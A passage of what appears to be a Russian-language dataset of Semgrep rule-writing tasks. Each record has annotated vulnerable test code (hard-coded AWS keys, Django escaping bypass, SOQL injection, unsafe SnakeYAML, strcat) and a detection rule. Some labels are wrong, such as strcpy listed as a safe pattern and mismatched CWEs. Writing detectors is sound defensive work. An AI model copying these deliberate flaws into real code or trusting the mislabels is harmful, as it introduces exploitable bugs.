    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: aws-lambda-environment-credentials.tf\n# pass\n\nresource \"aws_lambda_function\" \"pass\" {\n  function_name = \"test-env\"\n  role = \"\"\n  runtime = \"python3.8\"\n\n  environment {\n    variables = {\n      AWS_DEFAULT_REGION = \"us-west-2\"\n    }\n  }\n}\n\nresource \"aws_lambda_function\" \"no_env\" {\n  function_name = \"test-env\"\n  role = \"\"\n  runtime = \"python3.8\"\n}\n\n# fail\n\nresource \"aws_lambda_function\" \"fail\" {\n  function_name = \"stest-env\"\n  role = \"\"\n  runtime = \"python3.8\"\n\n  environment {\n    variables = {\n      # ruleid: aws-lambda-environment-credentials\n      AWS_ACCESS_KEY_ID     = \"AKIAIOSFODNN7EXAMPLE\",\n      # ruleid: aws-lambda-environment-credentials\n      AWS_SECRET_ACCESS_KEY = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n      AWS_DEFAULT_REGION    = \"us-west-2\"\n    }\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• aws_lambda_function { environment { variables = { AWS_ACCESS_KEY_ID = \"AKIAIOSFODNN7EXAMPLE\" } } }\n• aws_lambda_function { environment { variables = { AWS_SECRET_ACCESS_KEY = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\" } } }\n\nБезопасные паттерны:  \n• aws_lambda_function { environment { variables = { VAR1 = \"value\", VAR2 = \"another_value\" } } }\n• aws_lambda_function { environment { variables = {} } }\n\nЛегенда аннотаций:\n- // ruleid:aws-lambda-environment-credentials: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-lambda-environment-credentials: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-lambda-environment-credentials\n  patterns:\n  - pattern-inside: |\n      resource \"$ANYTING\" $ANYTHING {\n        ...\n        environment {\n          variables = {\n            ...\n          }\n        }\n        ...\n      }\n  - pattern-either:\n    - pattern-inside: |\n        AWS_ACCESS_KEY_ID = \"$Y\"\n    - pattern-regex: |\n        (?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])\n    - pattern-inside: |\n        AWS_SECRET_ACCESS_KEY = \"$Y\"\n    - pattern-regex: |\n        (?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])\n  - focus-metavariable: $Y\n  message: >-\n    A hard-coded credential was detected. It is not recommended to store credentials in source-code,\n    as this risks secrets\n    being leaked and used by either an internal or external malicious adversary. It is recommended to\n    use environment variables to securely provide credentials or retrieve credentials from a secure\n    vault or HSM (Hardware Security Module).\n  metadata:\n    category: security\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    technology:\n    - aws\n    - terraform\n    - secrets\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: HIGH\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных учетных данных AWS (AWS_ACCESS_KEY_ID и AWS_SECRET_ACCESS_KEY) внутри переменных среды ресурсов AWS Lambda в конфигурационном файле Terraform (.tf). Анализ выполняется путем поиска блока 'environment { variables = {'...'} }' внутри ресурса AWS Lambda и последующего сопоставления регулярных выражений для выявления жестко закодированных значений ключей доступа и секретов доступа AWS. Правило также учитывает окружение, где символы перед или после значения не являются буквами верхнего регистра или цифрами, что типично для жестко закодированных строк AWS.\n\n# Ключевые элементы:\n- ID: aws-lambda-environment-credentials\n- Язык: hcl \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "aws-lambda-environment-credentials",
      "language": "hcl",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения class-extends-safestring\nОписание уязвимости: Found a class extending 'SafeString', 'SafeText' or 'SafeData'. These classes are for bypassing the escaping engine built in to Django and should not be used directly. Improper use of this class exposes your application to cross-site scripting (XSS) vulnerabilities. If you need this functionality, use 'mark_safe' instead and ensure no user data can reach it.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: class-extends-safestring.py\nfrom django.utils.safestring import SafeString, SafeData, SafeText\n\n# ruleid:class-extends-safestring\nclass IWantToBypassEscaping(SafeString):\n    def __init__(self):\n        super().__init__()\n\n# ruleid:class-extends-safestring\nclass IWantToBypassEscaping2(SafeText):\n    def __init__(self):\n        super().__init__()\n\n# ruleid:class-extends-safestring\nclass IWantToBypassEscaping3(SafeData):\n    def __init__(self):\n        super().__init__()\n\n# ok:class-extends-safestring\nclass SomethingElse(str):\n    def __init__(self):\n        super().__init__()  # Ограничиваем длину\n\nОпасные паттерны:\n• class IWantToBypassEscaping(SafeString):\n    def __init__(self):\n        super().__init__()\n• class IWantToBypassEscaping2(SafeText):\n    def __init__(self):\n        super().__init__()\n• class IWantToBypassEscaping3(SafeData):\n    def __init__(self):\n        super().__init__()\n\nБезопасные паттерны:  \n• class SomethingElse(str):\n    def __init__(self):\n        super().__init__()\n\nЛегенда аннотаций:\n- // ruleid:class-extends-safestring: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:class-extends-safestring: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: class-extends-safestring\n  message: >-\n    Found a class extending 'SafeString', 'SafeText' or 'SafeData'. These classes are\n    for bypassing the escaping engine built in to Django and should not be\n    used directly. Improper use of this class exposes your application to\n    cross-site scripting (XSS) vulnerabilities. If you need this functionality,\n    use 'mark_safe' instead and ensure no user data can reach it.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.1/howto/custom-template-tags/#filters-and-auto-escaping\n    - https://github.com/django/django/blob/f138e75910b1e541686c4dce3d8f467f6fc234cb/django/utils/safestring.py#L11\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - python\n  severity: WARNING\n  pattern-either:\n  - pattern: |\n      class $CLASS(django.utils.safestring.SafeString):\n        ...\n  - pattern: |\n      class $CLASS(django.utils.safestring.SafeText):\n        ...\n  - pattern: |-\n      class $CLASS(django.utils.safestring.SafeData):\n        ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска классов, которые наследуются от 'SafeString', 'SafeText' или 'SafeData' в Python-коде. Эти классы используются для обхода встроенного механизма экранирования в Django и не должны использоваться напрямую. Неправильное их применение может привести к уязвимостям XSS. Правило использует оператор 'pattern-either' для проверки трех возможных шаблонов классов, каждый из которых соответствует одному из указанных типов безопасных строк.\n\n# Ключевые элементы:\n- ID: class-extends-safestring\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "class-extends-safestring",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: missing-yum-clean-all\nОписание уязвимости: This yum command does not end with '&& yum clean all'. Running 'yum clean all' will remove cached data and reduce package size. (This must be performed in the same RUN step.)\nCWE: \nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-yum-clean-all.dockerfile\nFROM centos\n\n# ok: missing-yum-clean-all\nRUN yum update \\\n    && yum install foo-1.0 \\\n    && yum clean all\n\n# ok: missing-yum-clean-all\nRUN yum update && \\\n    yum install foo-1.0 && \\\n    yum clean all\n\n# ruleid: missing-yum-clean-all\nRUN yum install foo-1.0  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN yum install foo-1.0\n\nБезопасные паттерны:  \n• RUN yum update && yum install foo-1.0 && yum clean all\n• RUN yum update && \\ yum install foo-1.0 && \\ yum clean all\n\nЛегенда аннотаций:\n- // ruleid:missing-yum-clean-all: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-yum-clean-all: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-yum-clean-all\n  severity: WARNING\n  languages: [generic]\n  patterns:\n  - pattern: yum $COMMAND\n  - pattern-not-inside: RUN ... && yum clean all\n  - pattern-not-inside: RUN ... && \\ yum clean all\n  message: >-\n    This yum command does not end with '&& yum clean all'. Running 'yum clean all' will remove cached\n    data and reduce package size. (This must be performed in the same RUN step.)\n  metadata:\n    source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3032\n    references:\n    - https://github.com/hadolint/hadolint/wiki/DL3032\n    category: best-practice\n    technology:\n    - dockerfile\n  paths:\n    include:\n    - '*dockerfile*'\n    - '*Dockerfile*'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска команд YUM, которые не завершаются инструкцией '&& yum clean all'. Оно использует два шаблона: первый шаблон ищет любую команду YUM ($COMMAND), второй шаблон исключает случаи, когда команда YUM находится внутри конструкции RUN ... && yum clean all или RUN ... && \\ yum clean all. Это позволяет обнаружить ситуации, когда YUM используется без очистки кеша.\n\n# Ключевые элементы:\n- ID: missing-yum-clean-all\n- Язык: generic \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-yum-clean-all",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения soql-injection-unescaped-url-param\nОписание уязвимости: If a dynamic query must be used,leverage nFORCE Query Builder. In other programming languages, the related flaw is known as SQL injection. Apex doesn't use SQL, but uses its own database query language, SOQL. SOQL is much simpler and more limited in functionality than SQL. The risks are much lower for SOQL injection than for SQL injection, but the attacks are nearly identical to traditional SQL injection. SQL/SOQL injection takes user-supplied input and uses those values in a dynamic SOQL query. If the input isn't validated, it can include SOQL commands that effectively modify the SOQL statement and trick the application into performing unintended commands.\nCWE: CWE-943: Improper Neutralization of Special Elements in Data Query Logic\nТип анализа: taint\nЯзык: apex\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: apex\n- Тип анализа: taint\n- CWE: CWE-943: Improper Neutralization of Special Elements in Data Query Logic\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: ApexSOQLInjectionFromUnescapedURLParam.cls\n/*\n * Test controller utilizing unescaped URL params\n */\npublic class ApexSOQLInjectionFromUnescapedURLParam {\n\n\tpublic void test1() {\n\t\tString unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\n\t\t// ruleid: soql-injection-unescaped-url-param\n\t\tDatabase.query('SELECT Id FROM Account' + unescapedString);\n\t}\n\n\tpublic void test2() {\n\t\tString unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\n\t\tString someQueryClause = someOtherString + unescapedString;\n\t\t// ruleid: soql-injection-unescaped-url-param\n\t\tDatabase.query('SELECT Id FROM Account' + someQueryClause);\n\t}\n\n\tpublic void test3() {\n\t\tString unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\n\t\tString escapedString = String.escapeSingleQuotes(unescapedString);\n\t\t// ok: soql-injection-unescaped-url-param\n\t\tDatabase.query('SELECT Id FROM Account' + escapedString);\n\t}\n\n\tpublic void test4() {\n\t\tString unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\n\t\tString escapedString = String.escapeSingleQuotes(unescapedString);\n\t\tString someQueryClause = someOtherString + escapedString;\n\t\t// ok: soql-injection-unescaped-url-param\n\t\tDatabase.query('SELECT Id FROM Account' + someQueryClause);\n\t}\n\n\tpublic void test5() {\n\t\tString unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\n\t\t// ok: soql-injection-unescaped-url-param\n\t\tDatabase.query('SELECT Id FROM Account' + String.escapeSingleQuotes(unescapedString));\n\t}\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• String unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\nDatabase.query('SELECT Id FROM Account' + unescapedString);\n• String unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\nString someQueryClause = someOtherString + unescapedString;\nDatabase.query('SELECT Id FROM Account' + someQueryClause\n\nБезопасные паттерны:  \n• String unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\nString escapedString = String.escapeSingleQuotes(unescapedString);\nDatabase.query('SELECT Id FROM Account' + escapedS\n• String unescapedString = ApexPage.getCurrentPage().getParameters.get('url_param');\nString escapedString = String.escapeSingleQuotes(unescapedString);\nString someQueryClause = someOtherString + escaped\n\nЛегенда аннотаций:\n- // ruleid:soql-injection-unescaped-url-param: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:soql-injection-unescaped-url-param: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: soql-injection-unescaped-url-param\n    min-version: 1.44.0\n    mode: taint\n    severity: ERROR\n    languages:\n      - apex\n    metadata:\n      category: security\n      subcategory:\n      - vuln\n      technology:\n      - salesforce\n      cwe:\n      - 'CWE-943: Improper Neutralization of Special Elements in Data Query Logic'\n      owasp:\n      - A03:2021 - Injection\n      references:\n      - https://cwe.mitre.org/data/definitions/943.html\n      impact: HIGH\n      likelihood: HIGH\n      confidence: HIGH\n    message: >-\n      If a dynamic query must be used,leverage nFORCE Query Builder.\n      In other programming languages, the related flaw is known as SQL injection.\n      Apex doesn't use SQL, but uses its own database query language, SOQL. SOQL is\n      much simpler and more limited in functionality than SQL. The risks are much\n      lower for SOQL injection than for SQL injection, but the attacks are nearly\n      identical to traditional SQL injection. SQL/SOQL injection takes user-supplied\n      input and uses those values in a dynamic SOQL query. If the input isn't validated,\n      it can include SOQL commands that effectively modify the SOQL statement and trick\n      the application into performing unintended commands.\n    pattern-sources:\n      - by-side-effect: true\n        pattern: ApexPage.getCurrentPage().getParameters.get($URLPARAM);\n    pattern-sanitizers:\n      - pattern: String.escapeSingleQuotes(...)\n    pattern-sinks:\n      - patterns:\n        - pattern: Database.query($SINK,...);\n        - focus-metavariable: $SINK\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей SOQL-инъекции, вызванных использованием необработанных параметров URL. Источником потенциально опасного ввода является вызов getParameters.get() объекта ApexPage.getCurrentPage(), который возвращает необработанный параметр URL ($URLPARAM). Санкция осуществляется путем вызова метода escapeSingleQuotes(), который должен быть применен перед выполнением динамического запроса через Database.query(). Если санкция не применяется, то существует риск выполнения непреднамеренных команд SOQL, что может привести к утечке данных или другим видам атак. Правило использует механизм сопоставления источников и синков для выявления таких ситуаций.\n\n# Ключевые элементы:\n- ID: soql-injection-unescaped-url-param\n- Язык: apex \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "soql-injection-unescaped-url-param",
      "language": "apex",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: use-snakeyaml-constructor\nОписание уязвимости: Used SnakeYAML org.yaml.snakeyaml.Yaml() constructor with no arguments, which is vulnerable to deserialization attacks. Use the one-argument Yaml(...) constructor instead, with SafeConstructor or a custom Constructor as the argument.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-snakeyaml-constructor.java\nimport org.yaml.snakeyaml.Yaml;\nimport org.yaml.snakeyaml.constructor.SafeConstructor;\n\npublic class SnakeYamlTestCase {\n    public void unsafeLoad(String toLoad) {\n        // ruleid:use-snakeyaml-constructor\n        Yaml yaml = new Yaml();\n        yaml.load(toLoad);\n    }\n\n    public void safeConstructorLoad(String toLoad) {\n        // ok:use-snakeyaml-constructor\n        Yaml yaml = new Yaml(new SafeConstructor());\n        yaml.load(toLoad);\n    }\n\n    public void customConstructorLoad(String toLoad, Class goodClass) {\n        // ok:use-snakeyaml-constructor\n        Yaml yaml = new Yaml(new Constructor(goodClass));\n        yaml.load(toLoad);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• Yaml yaml = new Yaml();\nyaml.load(toLoad);\n• Yaml yaml = new Yaml();\nyaml.loadAll(inputStream);\n• Yaml yaml = new Yaml();\nyaml.compose(yamlReader);\n\nБезопасные паттерны:  \n• Yaml yaml = new Yaml(new SafeConstructor());\nyaml.load(toLoad);\n• Yaml yaml = new Yaml(new Constructor(goodClass));\nyaml.load(toLoad);\n• Yaml yaml = new Yaml(new CustomConstructor());\nyaml.load(toLoad);\n\nЛегенда аннотаций:\n- // ruleid:use-snakeyaml-constructor: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-snakeyaml-constructor: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-snakeyaml-constructor\n  languages:\n  - java\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/#snakeyaml-deserialization-vulnerability\n    category: security\n    technology:\n    - snakeyaml\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  message: >-\n    Used SnakeYAML org.yaml.snakeyaml.Yaml() constructor with no arguments, which\n    is vulnerable to deserialization attacks.\n    Use the one-argument Yaml(...) constructor instead, with SafeConstructor or a\n    custom Constructor as the argument.\n  patterns:\n  - pattern: |\n      $Y = new org.yaml.snakeyaml.Yaml();\n      ...\n      $Y.load(...);\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования конструктора Yaml() из библиотеки SnakeYAML без аргументов. Такое использование подвержено атакам десериализации, так как не обеспечивает безопасную обработку загружаемых данных. Правило ищет создание экземпляра класса Yaml без передачи конструктора в качестве аргумента и последующий вызов метода load(). Безопасным является использование конструктора с передачей SafeConstructor или пользовательского конструктора в качестве аргумента.\n\n# Ключевые элементы:\n- ID: use-snakeyaml-constructor\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-snakeyaml-constructor",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: telnet-request\nОписание уязвимости: Checks for creation of telnet servers or attempts to connect through telnet. This is insecure as the telnet protocol supports no encryption, and data passes through unencrypted.\nCWE: C\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: telnet-request.js\nconst telnet = require('telnet-client');\nfunction bad_telnet1() {\n    const server = new telnet();\n\n    // display server response\n    // ruleid:telnet-request\n    server.on(\"data\", function(data){\n        console.log(''+data);\n    });\n\n    // login when connected\n    // ruleid:telnet-request\n    server.on(\"connect\", function(){\n        server.write(\"login <user> <pass>\");\n    });\n\n    // connect to server\n    // ruleid:telnet-request\n    server.connect({\n        host: \"172.16.0.1\",\n        port: 9600\n    });\n}\n\nconst Telnet = require('telnet-client');\nfunction bad_telnet2() {\n    var connection = new Telnet()\n\n    // these parameters are just examples and most probably won't work for your use-case.\n    var params = {\n    host: '127.0.0.1',\n    port: 23,\n    shellPrompt: '/ # ', // or negotiationMandatory: false\n    timeout: 1500,\n    // removeEcho: 4\n    }\n\n    // ruleid:telnet-request\n    connection.on('ready', function(prompt) {\n    connection.exec(cmd, function(err, response) {\n        console.log(response)\n    })\n    })\n\n    // ruleid:telnet-request\n    connection.on('timeout', function() {\n    console.log('socket timeout!')\n    connection.end()\n    })\n}\n\nvar Telnet = require('telnet-client')\nfunction bad_telnet3() {\n    var connection = new Telnet()\n\n    // these parameters are just examples and most probably won't work for your use-case.\n    var params = {\n    host: '127.0.0.1',\n    port: 23,\n    shellPrompt: '/ # ', // or negotiationMandatory: false\n    timeout: 1500,\n    // removeEcho: 4\n    }\n\n    // ruleid:telnet-request\n    connection.connect(params)\n    .then(function(prompt) {\n    connection.exec(cmd)\n    .then(function(res) {\n        console.log('promises result:', res)\n    })\n    }, function(error) {\n    console.log('promises reject:', error)\n    })\n    .catch(function(error) {\n    // handle the throw (timeout)\n    })\n}\n\nvar telnet = require('telnet')\n\nfunction bad_telnet4() {\n    // ruleid:telnet-request\n    telnet.createS  # Ограничиваем длину\n\nОпасные паттерны:\n• const telnet = require('telnet-client');\n...\nserver.on(\"data\", function(data){\n    console.log(''+data);\n});\n• var Telnet = require('telnet-client');\n...\nconnection.connect(params)\n.then(function(prompt) {\n    connection.exec(cmd)\n    .then(function(res) {\n        console.log('promises result:', res)\n    })\n},\n• var telnet = require('telnet');\n...\ntelnet.createServer(function (client) {\n...\n}).listen(23)\n\nБезопасные паттерны:  \n• const net = require('net');\n...\nconst server = net.createServer();\n• const http = require('http');\n...\nconst server = http.createServer();\n• const https = require('https');\n...\nconst server = https.createServer();\n\nЛегенда аннотаций:\n- // ruleid:telnet-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:telnet-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: telnet-request\n  message: >-\n    Checks for creation of telnet servers or attempts to connect through telnet. This is insecure as the\n    telnet protocol supports\n    no encryption, and data passes through unencrypted.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://www.npmjs.com/package/telnet\n    - https://www.npmjs.com/package/telnet-client\n    subcategory:\n    - vuln\n    technology:\n    - node.js\n    vulnerability: Insecure Transport\n  languages:\n  - javascript\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        $TEL = require('telnet-client');\n        ...\n        $SERVER = new $TEL();\n        ...\n    - pattern-inside: |\n        $SERVER = require('telnet');\n        ...\n  - pattern-either:\n    - pattern: |\n        $SERVER.on(...)\n    - pattern: |\n        $SERVER.connect(...)\n    - pattern: |\n        $SERVER.createServer(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска создания серверов telnet или попыток подключения через telnet. Паттерны используют комбинацию проверок на наличие конструкций require('telnet-client') или require('telnet'), а также вызовов методов on(), connect() и createServer(). Эти конструкции считаются небезопасными, так как протокол telnet не поддерживает шифрование и данные передаются в открытом виде.\n\n# Ключевые элементы:\n- ID: telnet-request\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "telnet-request",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: insecure-use-strcat-fn\nОписание уязвимости: Finding triggers whenever there is a strcat or strncat used. This is an issue because strcat or strncat can lead to buffer overflow vulns. Fix this by using strcat_s instead.\nCWE: CWE-676: Use of Potentially Dangerous Function\nТип анализа: search\nЯзык: c",
    "input": "Требования:\n- Язык: c\n- Тип анализа: search\n- CWE: CWE-676: Use of Potentially Dangerous Function\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-use-strcat-fn.c\n#include <stdio.h>\n\nint DST_BUFFER_SIZE = 120;\n\nint bad_strcpy(src, dst) {\n    n = DST_BUFFER_SIZE;\n    if ((dst != NULL) && (src != NULL) && (strlen(dst)+strlen(src)+1 <= n))\n    {\n        // ruleid: insecure-use-strcat-fn\n        strcat(dst, src);\n\n        // ruleid: insecure-use-strcat-fn\n        strncat(dst, src, 100);\n    }\n}\n\nint main() {\n   printf(\"Hello, World!\");\n   return 0;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: insecure-use-strcat-fn.c\nstrcat(buffer, user_input);\n• // File: another_insecure.c\nstrncat(some_buffer, untrusted_data, 100);\n\nБезопасные паттерны:  \n• // File: secure_code.c\nstrcpy(destination, source);\n• // File: safer_code.c\nstrncpy(safe_buffer, trusted_data, MAX_LENGTH);\n\nЛегенда аннотаций:\n- // ruleid:insecure-use-strcat-fn: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-use-strcat-fn: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-use-strcat-fn\n  pattern-either:\n  - pattern: strcat(...)\n  - pattern: strncat(...)\n  message: >-\n    Finding triggers whenever there is a strcat or strncat used.\n    This is an issue because strcat or strncat can lead to buffer overflow vulns.\n    Fix this by using strcat_s instead.\n  metadata:\n    cwe:\n    - 'CWE-676: Use of Potentially Dangerous Function'\n    references:\n    - https://nvd.nist.gov/vuln/detail/CVE-2019-12553\n    - https://techblog.mediaservice.net/2020/04/cve-2020-2851-stack-based-buffer-overflow-in-cde-libdtsvc/\n    category: security\n    technology:\n    - c\n    confidence: LOW\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  languages: [c]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций strcat и strncat, которые могут привести к переполнению буфера. Анализ выполняется путем поиска этих конкретных функций в коде. Правило использует оператор pattern-either для проверки наличия обеих функций одновременно.\n\n# Ключевые элементы:\n- ID: insecure-use-strcat-fn\n- Язык: c \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-use-strcat-fn",
      "language": "c",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: insecure-redirect\nОписание уязвимости: Detected an insecure redirect in this nginx configuration. If no scheme is specified, nginx will forward the request with the incoming scheme. This could result in unencrypted communications. To fix this, include the 'https' scheme.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-redirect.sites-available.conf\n\nserver {\n    listen 80;\n    listen [::]:80;\n\n    include proxy.conf;\n\n    server_name example;\n    root /var/www/example/;\n\n    include security.conf;\n\n    location / {\n        if ($http_user_agent ~* \"^web-browser$\") {\n            # ok: insecure-redirect\n            rewrite ^/(.*)$ https://$host/c/$1 redirect;\n        }\n\n        if ($http_accept ~* \"yaml\") {\n            # ruleid: insecure-redirect\n            rewrite ^/(.*)$ /c/$1 redirect;\n        }\n\n        if ($http_user_agent ~* \"^web-browser-2$\") {\n            # ok: insecure-redirect\n            rewrite ^/(.*)$ https://$host/c/$1 permanent;\n        }\n\n        if ($http_accept ~* \"json\") {\n            # ruleid: insecure-redirect\n            rewrite ^/(.*)$ /c/$1 permanent;\n        }\n\n        try_files $uri $uri/ /index.html;\n    }\n\n    location /privacy {\n        try_files /privacy.html =404;\n    }\n\n    location /api {\n        proxy_set_header Host                   $host;\n        proxy_set_header X-Real-IP              $remote_addr;\n        proxy_set_header X-Forwarded-For        $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto      $scheme;\n        proxy_set_header X-Forwarded-Host       $host;\n        proxy_set_header X-Forwarded-Port       $server_port;\n\n        proxy_pass http://localhost:5000;\n    }\n\n\n    # location for raw configs\n    location /c/ {\n        expires 1h;\n\n        proxy_set_header Host                   $host;\n        proxy_set_header X-Real-IP              $remote_addr;\n        proxy_set_header X-Forwarded-For        $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto      $scheme;\n        proxy_set_header X-Forwarded-Host       $host;\n        proxy_set_header X-Forwarded-Port       $server_port;\n\n        proxy_pass http://localhost:5000;\n    }\n\n    include general.conf;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• rewrite ^/(.*)$ /c/$1 redirect;\n• rewrite ^/(.*)$ /c/$1 permanent;\n\nБезопасные паттерны:  \n• rewrite ^/(.*)$ https://$host/c/$1 redirect;\n• rewrite ^/(.*)$ https://$host/c/$1 permanent;\n\nЛегенда аннотаций:\n- // ruleid:insecure-redirect: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-redirect: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
